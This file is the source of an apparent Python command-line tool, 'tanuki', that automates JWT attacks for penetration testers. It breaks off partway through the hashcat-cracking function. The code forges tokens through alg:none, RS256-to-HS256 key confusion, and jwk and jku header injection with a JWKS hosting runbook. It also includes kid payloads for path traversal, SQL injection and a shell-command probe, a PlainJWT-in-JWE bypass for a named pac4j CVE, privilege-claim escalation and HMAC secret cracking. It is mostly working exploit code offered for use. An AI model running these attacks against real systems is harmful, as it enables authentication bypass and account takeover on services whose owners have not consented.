#!/usr/bin/env python3
"""
tanuki — JWT Attack Automator
A CLI tool for penetration testers that runs every viable JWT attack against a
token in one pass and hands back ready-to-use forged tokens.

Designed for authorised security testing only.

Attacks:
  - decode / inspect
  - alg:none (and case variants: None, NONE, nOnE)
  - RS256 -> HS256 algorithm confusion (public key as HMAC secret)
  - HS256/384/512 secret cracking (hashcat 16500, john, or built-in)
  - jwk header injection (self-signed embedded key)
  - jku header injection (points verifier at attacker JWKS)
  - kid injection (path traversal, SQLi, command stub)
  - JWKS auto-discovery
  - automatic privilege-claim modification
  - live endpoint replay with response diffing

Requires: Python 3.8+. Optional: hashcat or john on PATH, requests, cryptography.
"""

import sys
import os
import json
import base64
import hmac
import hashlib
import math
import argparse
import subprocess
import tempfile
import shutil
import re
import time
from pathlib import Path
from urllib.parse import urljoin, urlparse

# ── Optional dependencies (degrade gracefully) ───────────────────────────────
try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# gmpy2 is an OPTIONAL accelerator used ONLY by the GCD-of-signatures key
# recovery. The costly step there is sig**e with NO modulus (n is unknown —
# recovering it is the whole point), so it can't be sped up with a modular pow;
# the fix is doing that unmodulated power + subtraction + GCD under GMP. With
# gmpy2 a 2048-bit e=65537 recovery takes seconds; in pure Python it takes hours.
# gmpy2 is a *declared* dependency (requirements.txt / `make install`), so the
# supported setup always has it — but this stays an optional import so the single
# file still runs with plain `python3 tanuki.py` (derivation then falls back to
# math.gcd, with an up-front warning + the --derive-timeout safety net).
try:
    import gmpy2 as _GMPY2
except ImportError:
    _GMPY2 = None


# ── Terminal colours (no dependency) ─────────────────────────────────────────
class C:
    R = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"

    @staticmethod
    def strip():
        for a in ("R", "BOLD", "DIM", "RED", "GRN", "YEL", "BLU", "MAG", "CYN"):
            setattr(C, a, "")


def banner():
    print(f"""{C.CYN}{C.BOLD}
     _                    _    _
    | |_ __ _ _ __  _   _| | _(_)
    | __/ _` | '_ \\| | | | |/ / |
    | || (_| | | | | |_| |   <| |
     \\__\\__,_|_| |_|\\__,_|_|\\_\\_|
{C.R}{C.DIM}  tanuki — JWT Attack Automator. Please don't get sued =[.{C.R}
""")


def ok(msg):    print(f"  {C.GRN}[+]{C.R} {msg}")
def fail(msg):  print(f"  {C.RED}[-]{C.R} {msg}")
def info(msg):  print(f"  {C.BLU}[*]{C.R} {msg}")
def warn(msg):  print(f"  {C.YEL}[!]{C.R} {msg}")
def skip(msg):  print(f"  {C.DIM}[–] {msg}{C.R}")
def hdr(msg):   print(f"\n{C.BOLD}{C.MAG}── {msg} {'─' * max(0, 56 - len(msg))}{C.R}")


# ── Presentation layer (--demo / --step) ─────────────────────────────────────
# A pure output-pacing wrapper for live demos. In normal mode EVERY method is a
# no-op, so default (non-demo) output is byte-for-byte unchanged. It never reads,
# changes, or reclassifies anything — it only paces and streams the existing
# output calls, and (only under --step on a real TTY) waits for Enter.
class Presenter:
    def __init__(self, demo=False, step=False, delay=0.4, interactive=None,
                 banners=False, no_color=None):
        self.demo = bool(demo or step)       # --step implies --demo pacing
        self.step = bool(step)
        # the legibility layer (banners / loud verdicts / before→after) is on for
        # any of --demo / --step / --banners; pacing & streaming need --demo.
        self.banners = bool(banners or self.demo)
        try:
            self.delay = max(0.0, float(delay))
        except (TypeError, ValueError):
            self.delay = 0.4
        if no_color is None:
            no_color = _present_no_color()
        self.no_color = bool(no_color)
        if interactive is None:
            # only a real TTY on BOTH ends may block for input
            try:
                interactive = bool(sys.stdin.isatty() and sys.stdout.isatty())
            except Exception:
                interactive = False
        self.interactive = bool(step and interactive)

    def pace(self, mult=1.0):
        if self.demo and self.delay > 0:
            time.sleep(self.delay * mult)

    def narrate(self, msg):
        """One-line explanation before an attack class — demo mode only."""
        if self.demo:
            print(f"  {C.DIM}» {msg}{C.R}")

    def gate(self, prompt="continue"):
        """Phase boundary. --step on a TTY waits for Enter; --demo paces; normal
        mode does nothing. Never blocks unless genuinely interactive."""
        if self.interactive:
            try:
                input(f"  {C.DIM}[Enter] {prompt} …{C.R}")
            except (EOFError, KeyboardInterrupt):
                pass
        elif self.demo:
            self.pace(1.5)

    def item(self):
        """Small pause between streamed items (tokens / rows) — demo mode only."""
        if self.demo:
            self.pace(0.5)

    # -- legibility layer (gated by self.banners) --
    def banner(self, title, subtitle=""):
        if self.banners:
            demo_banner(title, subtitle, no_color=self.no_color)

    def whatwedo(self, text):
        if self.banners:
            demo_whatwedo(text, no_color=self.no_color)

    def verdict(self, success, text="", ok_label=None, fail_label=None):
        if self.banners:
            demo_verdict(success, text, no_color=self.no_color,
                         ok_label=ok_label, fail_label=fail_label)

    def before_after(self, before, after):
        if self.banners:
            demo_before_after(before, after, no_color=self.no_color)

    def begin_test(self, label, idx=None, total=None):
        """Show a 'testing…' placeholder for a replay item. Returns whether a
        placeholder was shown (so end_test can resolve it). No-op in normal mode.
        With idx/total it shows a '[N/total]' scan progress indicator."""
        if not self.demo:
            return False
        prog = f"[{idx}/{total}] " if (idx and total) else ""
        txt = f"  {C.DIM}· {prog}{label[:44]:44} testing…{C.R}"
        try:
            is_tty = sys.stdout.isatty()
        except Exception:
            is_tty = False
        if is_tty:
            sys.stdout.write(txt)
            sys.stdout.flush()
        else:
            print(txt)
        self.pace(0.6)
        return True

    def end_test(self, shown, final_line):
        """Resolve a placeholder to its final verdict line. In normal mode this
        is just print(final_line) — identical to the original output."""
        if shown:
            try:
                if sys.stdout.isatty():
                    sys.stdout.write("\r\033[2K")   # carriage-return + clear line
                    sys.stdout.flush()
            except Exception:
                pass
        print(final_line)


# ── Reusable banner / verdict helpers (used by the --demo/--banners layer) ──────
# These degrade cleanly: plain ASCII with no escape codes when stdout isn't a TTY
# (or NO_COLOR is set, or --no-color is passed), and a clean box when figlet is
# absent. They are presentation-only and never affect default (non-demo) output.
def _present_no_color(no_color=None):
    if no_color is not None:
        return bool(no_color)
    try:
        if not sys.stdout.isatty():
            return True
    except Exception:
        return True
    return bool(os.environ.get("NO_COLOR"))


def figlet_available():
    return shutil.which("figlet") is not None


def _stdout_isatty():
    try:
        return bool(sys.stdout.isatty())
    except Exception:
        return False


def demo_banner(title, subtitle="", no_color=None):
    """Full-width section banner: figlet title if available (on a TTY), else a
    clean ASCII box; plus an optional one-line plain-language subtitle. Colour is
    governed by --no-color / NO_COLOR / non-TTY; figlet is used on a TTY even when
    colour is off (it's plain ASCII art, not escape codes). Piped output stays a
    compact plain-text box."""
    nc = _present_no_color(no_color)
    head = "" if nc else (C.BOLD + C.MAG)
    sub = "" if nc else C.DIM
    r = "" if nc else C.R
    width = 66
    rule = "=" * width
    print()
    print(f"{head}{rule}{r}")
    art = None
    if figlet_available() and _stdout_isatty():
        try:
            out = subprocess.run(["figlet", "-w", str(width), title],
                                 capture_output=True, text=True, timeout=5)
            if out.returncode == 0 and out.stdout.strip():
                art = out.stdout.rstrip("\n")
        except Exception:
            art = None
    if art is not None:
        for ln in art.splitlines():
            print(f"{head}{ln}{r}")
    else:
        print(f"{head}  {title}{r}")
    if subtitle:
        print(f"{sub}  {subtitle}{r}")
    print(f"{head}{rule}{r}")
    print()


def demo_whatwedo(text, no_color=None):
    nc = _present_no_color(no_color)
    c = "" if nc else C.CYN
    r = "" if nc else C.R
    print(f"  {c}>> WHAT WE'RE DOING:{r} {text}")


def demo_verdict(success, text="", no_color=None, ok_label=None, fail_label=None):
    nc = _present_no_color(no_color)
    if success:
        tag = ok_label or "✓ BYPASS CONFIRMED"
        col = "" if nc else (C.GRN + C.BOLD)
    else:
        tag = fail_label or "✗ REJECTED — ENDPOINT IS SECURE"
        col = "" if nc else (C.RED + C.BOLD)
    r = "" if nc else C.R
    msg = f"{tag} — {text}" if text else tag
    print(f"\n  {col}>>> {msg} <<<{r}\n")


def demo_before_after(before, after, no_color=None):
    nc = _present_no_color(no_color)
    dim = "" if nc else C.DIM
    grn = "" if nc else (C.GRN + C.BOLD)
    r = "" if nc else C.R
    print(f"  {dim}BEFORE  {before}{r}")
    print(f"  {grn}AFTER   {after}{r}")


_PRES = Presenter()   # module default: normal mode, every method a no-op


# ── base64url helpers ────────────────────────────────────────────────────────
def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data):
    if isinstance(data, str):
        data = data.encode()
    pad = b"=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def encode_segment(obj):
    """JSON-encode a dict with compact separators, then base64url."""
    return b64url_encode(json.dumps(obj, separators=(",", ":")))


# ── JWT parsing ──────────────────────────────────────────────────────────────
class JWT:
    def __init__(self, token):
        token = token.strip()
        parts = token.split(".")
        if len(parts) not in (2, 3):
            raise ValueError("Not a valid JWT (expected 2 or 3 dot-separated parts)")
        self.raw = token
        self.header_b64 = parts[0]
        self.payload_b64 = parts[1]
        self.sig_b64 = parts[2] if len(parts) == 3 else ""
        try:
            self.header = json.loads(b64url_decode(self.header_b64))
        except Exception:
            raise ValueError("Header is not valid base64url-encoded JSON "
                             "(is this actually a JWT?)")
        try:
            self.payload = json.loads(b64url_decode(self.payload_b64))
        except Exception:
            raise ValueError("Payload is not valid base64url-encoded JSON "
                             "(is this actually a JWT?)")

    @property
    def signing_input(self):
        return f"{self.header_b64}.{self.payload_b64}"

    @property
    def signature(self):
        return b64url_decode(self.sig_b64) if self.sig_b64 else b""


# ── Privilege claim detection / modification ─────────────────────────────────
PRIV_CLAIMS = {
    "role": "admin", "roles": "admin", "isadmin": True, "admin": True,
    "is_admin": True, "user_role": "admin", "usertype": "admin",
    "account_type": "admin", "group": "admin", "groups": "admin",
    "permissions": ["admin"], "scope": "admin", "scopes": "admin",
    "privilege": "admin", "level": "admin", "access_level": "admin",
    "authority": "ROLE_ADMIN", "authorities": ["ROLE_ADMIN"],
    "verified": True, "active": True, "subscription": "premium",
}


def suggest_modifications(payload):
    """Return a modified payload flipping any recognised privilege claims."""
    modified = dict(payload)
    changed = []
    for key in list(payload.keys()):
        lk = key.lower()
        if lk in PRIV_CLAIMS:
            new_val = PRIV_CLAIMS[lk]
            # match the original type where sensible
            if isinstance(payload[key], bool):
                new_val = True
            elif isinstance(payload[key], list):
                new_val = new_val if isinstance(new_val, list) else [new_val]
            elif isinstance(payload[key], (int, float)) and not isinstance(payload[key], bool):
                continue  # don't blindly flip numeric levels — report instead
            modified[key] = new_val
            changed.append((key, payload[key], new_val))
    # bump exp if present and in the past-ish — extend to far future
    if "exp" in modified:
        modified["exp"] = 9999999999
        changed.append(("exp", payload.get("exp"), 9999999999))
    return modified, changed


def parse_custom_claims(spec):
    """Parse 'role=admin,isAdmin=true' into a dict with typed values."""
    out = {}
    if not spec:
        return out
    for pair in spec.split(","):
        if "=" not in pair:
            continue
        k, v = pair.split("=", 1)
        k, v = k.strip(), v.strip()
        # type inference
        if v.lower() == "true":
            v = True
        elif v.lower() == "false":
            v = False
        elif v.lower() == "null":
            v = None
        elif v.startswith("[") or v.startswith("{"):
            try:
                v = json.loads(v)
            except Exception:
                pass
        elif re.fullmatch(r"-?\d+", v):
            v = int(v)
        out[k] = v
    return out


# ── Attack modules ───────────────────────────────────────────────────────────
def attack_alg_none(jwt, new_payload):
    """alg:none and its case variants. Returns list of (label, token)."""
    tokens = []
    for alg in ("none", "None", "NONE", "nOnE"):
        header = {"alg": alg, "typ": "JWT"}
        tok = f"{encode_segment(header)}.{encode_segment(new_payload)}."
        tokens.append((f"alg:{alg}", tok))
    return tokens


def attack_key_confusion(jwt, new_payload, pubkey_pem):
    """RS256 -> HS256: sign with the RSA public key bytes as the HMAC secret.

    Tries several representations of the public key, because servers differ in
    exactly which byte-string they feed to the HMAC verifier.
    """
    results = []
    orig_alg = jwt.header.get("alg", "")
    if not orig_alg.upper().startswith(("RS", "ES", "PS")):
        return results, "token is not asymmetric (alg is %s) — confusion N/A" % orig_alg
    if not pubkey_pem:
        return results, "no public key available (supply --pubkey or let JWKS discovery find one)"

    # Normalise to PEM bytes variants
    pem_variants = _pubkey_variants(pubkey_pem)

    for label, key_bytes in pem_variants:
        for alg, hfunc in (("HS256", hashlib.sha256),
                           ("HS384", hashlib.sha384),
                           ("HS512", hashlib.sha512)):
            header = {"alg": alg, "typ": "JWT"}
            signing_input = f"{encode_segment(header)}.{encode_segment(new_payload)}"
            sig = hmac.new(key_bytes, signing_input.encode(), hfunc).digest()
            tok = f"{signing_input}.{b64url_encode(sig)}"
            results.append((f"{alg} w/ pubkey [{label}]", tok))
    return results, None


def _pubkey_variants(pubkey_pem):
    """Produce the byte representations of a public key that servers may HMAC with."""
    variants = []
    pem_str = pubkey_pem if isinstance(pubkey_pem, str) else pubkey_pem.decode()
    pem_bytes = pem_str.encode()

    # 1. PEM exactly as given
    variants.append(("pem-raw", pem_bytes))
    # 2. PEM with trailing newline (very common — files end in \n)
    if not pem_str.endswith("\n"):
        variants.append(("pem-newline", pem_bytes + b"\n"))
    else:
        variants.append(("pem-stripped", pem_str.rstrip("\n").encode()))

    # 3. If cryptography is available, re-serialise to canonical PKCS1 and SPKI
    if HAS_CRYPTO:
        try:
            key = load_pem_public_key(pem_bytes)
            spki = key.public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            variants.append(("spki-pem", spki))
            variants.append(("spki-pem-stripped", spki.rstrip(b"\n")))
            try:
                pkcs1 = key.public_bytes(
                    serialization.Encoding.PEM,
                    serialization.PublicFormat.PKCS1,
                )
                variants.append(("pkcs1-pem", pkcs1))
            except Exception:
                pass
        except Exception:
            pass

    # dedupe preserving order
    seen, out = set(), []
    for label, b in variants:
        if b not in seen:
            seen.add(b)
            out.append((label, b))
    return out


def attack_jwk_injection(jwt, new_payload):
    """Embed a self-generated public key in the header's jwk and sign with its private key."""
    if not HAS_CRYPTO:
        return None, "cryptography not installed — cannot generate keypair"
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    numbers = pub.public_numbers()

    def b64url_uint(n):
        length = (n.bit_length() + 7) // 8
        return b64url_encode(n.to_bytes(length, "big"))

    jwk = {
        "kty": "RSA",
        "kid": "tanuki-" + b64url_encode(os.urandom(6)),
        "use": "sig",
        "alg": "RS256",
        "n": b64url_uint(numbers.n),
        "e": b64url_uint(numbers.e),
    }
    header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
    signing_input = f"{encode_segment(header)}.{encode_segment(new_payload)}"
    sig = priv.sign(signing_input.encode(), padding.PKCS1v15(), hashes.SHA256())
    tok = f"{signing_input}.{b64url_encode(sig)}"
    return tok, None


def attack_jku_injection(jwt, new_payload, attacker_jwks_url):
    """jku header injection — point the verifier at an attacker-hosted JWKS.

    Generates a keypair, signs the token (jku header → attacker_jwks_url), and
    returns (artifacts, err) where artifacts is a dict:
        token        the forged JWT
        jwks_json    the JWKS JSON to host (pretty-printed)
        kid          the key id — identical in the token header and the JWKS
        private_pem  the matching private key (only shown with --show-private)
    """
    if not HAS_CRYPTO:
        return None, "cryptography not installed"
    if not attacker_jwks_url:
        return None, "no --jku-url supplied (where will you host the JWKS?)"
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    numbers = pub.public_numbers()

    def b64url_uint(n):
        length = (n.bit_length() + 7) // 8
        return b64url_encode(n.to_bytes(length, "big"))

    kid = "tanuki-jku"
    header = {"alg": "RS256", "typ": "JWT", "jku": attacker_jwks_url, "kid": kid}
    signing_input = f"{encode_segment(header)}.{encode_segment(new_payload)}"
    sig = priv.sign(signing_input.encode(), padding.PKCS1v15(), hashes.SHA256())
    tok = f"{signing_input}.{b64url_encode(sig)}"

    jwks = {"keys": [{
        "kty": "RSA", "kid": kid, "use": "sig", "alg": "RS256",   # kid matches the token
        "n": b64url_uint(numbers.n), "e": b64url_uint(numbers.e),
    }]}
    private_pem = priv.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ).decode()
    return {"token": tok, "jwks_json": json.dumps(jwks, indent=2),
            "kid": kid, "private_pem": private_pem}, None


def _send_token_curl(token, target_url=None, cookie=None,
                     header="Authorization", header_fmt="Bearer {token}"):
    """A copy-paste curl that sends the forged token the way the run was configured
    (cookie if --cookie was given, else the header), with the real target URL."""
    tok = token or "<THE_FORGED_JKU_TOKEN>"
    tgt = target_url or "<target-url>"
    if cookie:
        return 'curl -i -H "Cookie: %s=%s" %s' % (cookie, tok, tgt)
    value = (header_fmt or "Bearer {token}").format(token=tok)
    return 'curl -i -H "%s: %s" %s' % (header or "Authorization", value, tgt)


def build_jku_hosting_kit(jku_url, jwks_json, port=8000, token=None,
                          target_url=None, cookie=None, header="Authorization",
                          header_fmt="Bearer {token}"):
    """Ready-to-use artifacts for hosting the jku JWKS. Returns a dict with the
    hosting-form fields (option 1 — for a VPS hosting form, PortSwigger's exploit
    server, etc.) and a complete self-host runbook (option 2): host → confirm
    reachable → send the forged token."""
    parsed = urlparse(jku_url)
    path = parsed.path or "/.well-known/jwks.json"
    filename = path.lstrip("/") or "jwks.json"
    # The token's jku is fixed, so the server MUST listen on the jku URL's port.
    # --jku-port only applies when the URL doesn't specify one.
    serve_port = parsed.port or port

    lines = []
    dirpath = os.path.dirname(filename)
    if dirpath:
        lines.append("mkdir -p %s" % dirpath)
    lines.append("cat > %s <<'JWKS'" % filename)
    lines.append(jwks_json)
    lines.append("JWKS")
    lines.append("python3 -m http.server %d" % serve_port)

    return {
        "file": path,                         # hosting-form "File" field
        "content_type": "application/json",   # hosting-form "Content-Type" field
        "body": jwks_json,                    # hosting-form "Body" field
        "server_snippet": "\n".join(lines),   # local/standalone host
        "served_url": jku_url,
        "port": serve_port,
        "self_host_note": ("Use this ONLY if --jku-url above is YOUR server's "
                           "reachable address — the token's jku must match where you "
                           "host. If you're hosting via a form (e.g. a hosting form or "
                           "PortSwigger's exploit server), use option 1 instead."),
        "confirm_cmd": "curl -s %s" % jku_url,          # should return the JWKS JSON
        "send_cmd": _send_token_curl(token, target_url, cookie, header, header_fmt),
        "token_reminder": ("send the jku-attack token (the JWT printed above) — NOT "
                           "the JWKS or anything else from this hosting kit."),
        "reminder": ("target can't reach your IP directly? relay the JWKS via "
                     "ngrok (`ngrok http %d`), interactsh, or a foothold host — "
                     "point --jku-url at that reachable address." % serve_port),
    }


def print_jku_hosting_kit(jku_url, artifacts, port=8000, show_private=False,
                          target_url=None, cookie=None, header="Authorization",
                          header_fmt="Bearer {token}"):
    """Print the HOSTING KIT: hosting-form fields, a complete self-host runbook,
    and a reachability reminder. Always prints (independent of any self-serve)."""
    kit = build_jku_hosting_kit(jku_url, artifacts["jwks_json"], port=port,
                                token=artifacts["token"], target_url=target_url,
                                cookie=cookie, header=header, header_fmt=header_fmt)
    hdr("jku Hosting Kit")
    info("kid (token header = JWKS): %s" % artifacts["kid"])

    print(f"\n  {C.BOLD}1) Host the JWKS where the target can reach it.{C.R}")
    print("     If your host uses a response form (e.g. a hosting form or "
          "PortSwigger's exploit server), these are the fields:")
    print(f"     {C.YEL}File:{C.R}          {kit['file']}")
    print(f"     {C.YEL}Content-Type:{C.R}  {kit['content_type']}")
    print(f"     {C.YEL}Body:{C.R}")
    for line in kit["body"].splitlines():
        print(f"       {line}")

    print(f"\n  {C.BOLD}2) Local / standalone server — host it yourself:{C.R}")
    print(f"     {C.RED}⚠ {kit['self_host_note']}{C.R}")
    print(f"     {C.DIM}# a) write + serve the JWKS (jku must resolve to this host:{kit['port']}){C.R}")
    for line in kit["server_snippet"].splitlines():
        print(f"     {line}")
    print(f"     {C.DIM}# b) confirm it's reachable (should return the JWKS JSON){C.R}")
    print(f"     {kit['confirm_cmd']}")
    print(f"     {C.DIM}# c) fire the attack — {kit['token_reminder']}{C.R}")
    print(f"     {kit['send_cmd']}")

    print(f"\n  {C.BOLD}3) Reachability:{C.R} {kit['reminder']}")

    if show_private:
        print(f"\n  {C.DIM}private key (normally not needed — the token is already "
              f"signed; here for reuse/debugging):{C.R}")
        for line in artifacts["private_pem"].splitlines():
            print(f"     {line}")


def attack_kid_injection(jwt, new_payload):
    """kid header attacks — only applicable if the original token has a kid claim."""
    results = []
    if "kid" not in jwt.header:
        return results, "no kid claim in header — skipping"

    # 1. kid path traversal to /dev/null → empty key → sign with empty HMAC secret
    header = {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}
    signing_input = f"{encode_segment(header)}.{encode_segment(new_payload)}"
    sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
    results.append(("kid->/dev/null (empty key)", f"{signing_input}.{b64url_encode(sig)}"))

    # 2. kid pointing at a predictable file with known content (e.g. /proc/sys/kernel/randomize_va_space often '2\n')
    # We provide a template — the tester supplies the known-content file + its bytes
    # Common trick: point kid at a static file you control via another upload, HMAC with that content.

    # 3. kid SQL injection — if kid is used in a DB lookup returning the signing key
    #    Make the query return a known value you control, then HMAC with it.
    sqli_kid = "nonexistent' UNION SELECT 'attackerkey'-- -"
    header = {"alg": "HS256", "typ": "JWT", "kid": sqli_kid}
    signing_input = f"{encode_segment(header)}.{encode_segment(new_payload)}"
    sig = hmac.new(b"attackerkey", signing_input.encode(), hashlib.sha256).digest()
    results.append(("kid SQLi (key='attackerkey')", f"{signing_input}.{b64url_encode(sig)}"))

    # 4. kid command injection stub (for RCE where kid is passed to a shell)
    header = {"alg": jwt.header.get("alg", "HS256"), "typ": "JWT",
              "kid": "key.pem; sleep 5"}
    signing_input = f"{encode_segment(header)}.{encode_segment(new_payload)}"
    results.append(("kid command-injection probe (blind, sleep 5)",
                    f"{signing_input}.{jwt.sig_b64}"))

    return results, None


# ── PlainJWT-in-JWE  (CVE-2026-29000 — pac4j-jwt JwtAuthenticator bypass) ──────
# pac4j-jwt's JwtAuthenticator, when it decrypts a JWE whose inner token is an
# unsigned PlainJWT (alg:none), hits a logic error that SKIPS signature
# verification and builds a profile straight from the unverified claims. So the
# attack is: take tanuki's EXISTING alg:none token (tampered claims) and wrap it
# in a JWE encrypted to the server's RSA public key. The envelope is built with the
# `cryptography` library (RSA-OAEP / PKCS1v15 key-wrap; AES-GCM and AES-CBC+HMAC
# content encryption) — no hand-rolled crypto, no new hard dependency.

# Server expectation is unknown, so cover the common (alg, enc) set, same
# philosophy as the key-confusion byte-variants. RSA-OAEP-256 / A128GCM is the
# combination the public PoC confirms, so it's tried FIRST.
JWE_KEY_ALGS = ("RSA-OAEP-256", "RSA-OAEP", "RSA1_5")
JWE_ENCS = ("A128GCM", "A256GCM", "A128CBC-HS256", "A256CBC-HS512")
# enc -> (CEK length, IV length, mode)
_JWE_ENC_PARAMS = {
    "A128GCM":       (16, 12, "gcm"),
    "A256GCM":       (32, 12, "gcm"),
    "A128CBC-HS256": (32, 16, "cbc"),   # 16-byte MAC key + 16-byte AES-128 key
    "A256CBC-HS512": (64, 16, "cbc"),   # 32-byte MAC key + 32-byte AES-256 key
}
_JWE_CBC_HASH = {"A128CBC-HS256": hashlib.sha256, "A256CBC-HS512": hashlib.sha512}


def _jwe_wrap_cek(pub_key, alg, cek):
    """RSA-wrap the content-encryption key for the given JWE key-management alg."""
    if alg == "RSA1_5":
        return pub_key.encrypt(cek, padding.PKCS1v15())
    h = hashes.SHA256() if alg == "RSA-OAEP-256" else hashes.SHA1()  # RSA-OAEP = SHA-1
    return pub_key.encrypt(cek, padding.OAEP(mgf=padding.MGF1(h), algorithm=h,
                                             label=None))


def _jwe_content_encrypt(enc, cek, plaintext, aad, iv):
    """Encrypt the plaintext for the given JWE `enc`. Returns (ciphertext, tag).

    GCM via AESGCM; CBC via AES-CBC + HMAC-SHA2 (RFC 7518 §5.2.2).
    """
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    cek_len, _iv_len, mode = _JWE_ENC_PARAMS[enc]
    if mode == "gcm":
        ct_and_tag = AESGCM(cek).encrypt(iv, plaintext, aad)
        return ct_and_tag[:-16], ct_and_tag[-16:]        # GCM tag is the last 16 bytes
    # AES_CBC_HMAC_SHA2: first half of CEK = MAC key, second half = AES key
    half = cek_len // 2
    mac_key, enc_key = cek[:half], cek[half:]
    pad = 16 - (len(plaintext) % 16)                      # PKCS#7
    padded = plaintext + bytes([pad]) * pad
    enc_op = Cipher(algorithms.AES(enc_key), modes.CBC(iv)).encryptor()
    ct = enc_op.update(padded) + enc_op.finalize()
    al = (len(aad) * 8).to_bytes(8, "big")               # AAD bit-length, 64-bit BE
    mac = hmac.new(mac_key, aad + iv + ct + al, _JWE_CBC_HASH[enc]).digest()
    return ct, mac[:half]                                 # tag = first half of the HMAC


def build_jwe(pub_key, alg, enc, plaintext, kid=None):
    """Build a compact JWE (5 base64url parts) wrapping `plaintext` to `pub_key`.

    The protected header carries cty:"JWT" — that is what makes pac4j parse the
    decrypted content as a nested JWT and reach the vulnerable PlainJWT path, so it
    must never be omitted. When `kid` is given (the JWKS key id), it is echoed into
    the header so the server selects the matching decryption key.
    """
    cek_len, iv_len, _mode = _JWE_ENC_PARAMS[enc]
    cek, iv = os.urandom(cek_len), os.urandom(iv_len)
    protected = {"alg": alg, "enc": enc}
    if kid:
        protected["kid"] = kid
    protected["cty"] = "JWT"
    protected_b64 = encode_segment(protected)
    aad = protected_b64.encode("ascii")                  # AAD = ASCII(protected header)
    encrypted_key = _jwe_wrap_cek(pub_key, alg, cek)
    ct, tag = _jwe_content_encrypt(enc, cek, plaintext, aad, iv)
    return ".".join([protected_b64, b64url_encode(encrypted_key),
                     b64url_encode(iv), b64url_encode(ct), b64url_encode(tag)])


def _mint_plainjwt_claims(new_payload):
    """The inner PlainJWT claims, defaulting iat (now) + a near-future exp so
    servers that validate token freshness (pac4j does) accept it."""
    claims = dict(new_payload)
    now = int(time.time())
    claims.setdefault("iat", now)
    claims.setdefault("exp", now + 3600)       # ~1h window
    return claims


def attack_plainjwt_in_jwe(jwt, new_payload, pubkey_pem, kid=None):
    """CVE-2026-29000: wrap an alg:none PlainJWT (attacker claims) in a JWE encrypted
    to the server's RSA public key, one per (alg, enc) combo.

    This is UNAUTHENTICATED — the inner token is minted from ``new_payload`` alone,
    so ``jwt`` may be None (no input token needed). ``kid`` (from the JWKS) is echoed
    into each JWE header. Returns (results, err); `err` is set (results empty) when
    there's no usable RSA public key.
    """
    if not HAS_CRYPTO:
        return [], "cryptography not installed — cannot build JWE"
    if not pubkey_pem:
        return [], ("PlainJWT-in-JWE needs the server's RSA public key — supply "
                    "--pubkey or a JWKS URL (or let --derive-key recover one)")
    try:
        pem_bytes = pubkey_pem.encode() if isinstance(pubkey_pem, str) else pubkey_pem
        pub_key = load_pem_public_key(pem_bytes)
    except Exception as e:
        return [], "could not load the public key for JWE: %s" % e
    if not isinstance(pub_key, rsa.RSAPublicKey):
        return [], "public key is not RSA — JWE key-wrap here needs an RSA key"

    # The inner token is an unsigned PlainJWT: header {"alg":"none"}, the chosen
    # claims (with iat/exp defaulted in), and an empty signature segment
    # (header.payload. with a trailing dot) — the form that reaches pac4j's
    # vulnerable toSignedJWT()==null.
    claims = _mint_plainjwt_claims(new_payload)
    inner = "%s.%s." % (encode_segment({"alg": "none"}), encode_segment(claims))
    inner_bytes = inner.encode()

    results = []
    for alg in JWE_KEY_ALGS:
        for enc in JWE_ENCS:
            try:
                jwe = build_jwe(pub_key, alg, enc, inner_bytes, kid=kid)
            except Exception:
                continue   # e.g. modulus too small for OAEP-256 — just skip that combo
            results.append((f"JWE {alg} + {enc}", jwe))
    return results, None


# ── HS256 secret cracking ────────────────────────────────────────────────────
HASHCAT_MODE = {"HS256": 16500, "HS384": 16511, "HS512": 16512}


def crack_secret(jwt, wordlist, prefer="auto", rules=None):
    """Crack the HMAC secret. Tries hashcat, then john, then built-in brute.

    Returns (secret, method) or (None, reason).
    """
    alg = jwt.header.get("alg", "").upper()
    if not alg.startswith("HS"):
        return None, f"token alg is {alg or '(none)'} — not HMAC, nothing to crack"
    if not jwt.sig_b64:
        return None, "token has no signature to crack"

    order = []
    if prefer == "auto":
        order = ["hashcat", "john", "builtin"]
    elif prefer == "hashcat":
        order = ["hashcat", "builtin"]
    elif prefer == "john":
        order = ["john", "builtin"]
    elif prefer == "builtin":
        order = ["builtin"]

    for method in order:
        if method == "hashcat" and shutil.which("hashcat"):
            secret = _crack_hashcat(jwt, wordlist, alg, rules)
            if secret is not None:
                return secret, "hashcat"
            # if hashcat ran and exhausted, don't fall through silently
            info("hashcat exhausted the wordlist without a hit")
            return None, "hashcat: exhausted"
        if method == "john" and shutil.which("john"):
            secret = _crack_john(jwt, wordlist)
            if secret is not None:
                return secret, "john"
            info("john exhausted the wordlist without a hit")
            return None, "john: exhausted"
        if method == "builtin":
            if not os.path.exists(wordlist):
                return None, f"wordlist not found: {wordlist}"
            secret = _crack_builtin(jwt, wordlist, alg)
            if secret is not None:
                return secret, "builtin"
            return None, "builtin: exhausted"

    return None, "no cracking backend available (install hashcat or john, or supply a readable wordlist)"


def _crack_hashcat(jwt, wordlist, alg, rules):
    mode = HASHCAT_MODE.get(alg, 16500)
    info(f"running hashcat -m {mode} against the token ...")
    with tempfile.NamedTemporaryFile("w", suffix=".jwt", delete=False) as f:
        f.write(jwt.raw)
        hashfile = f.name
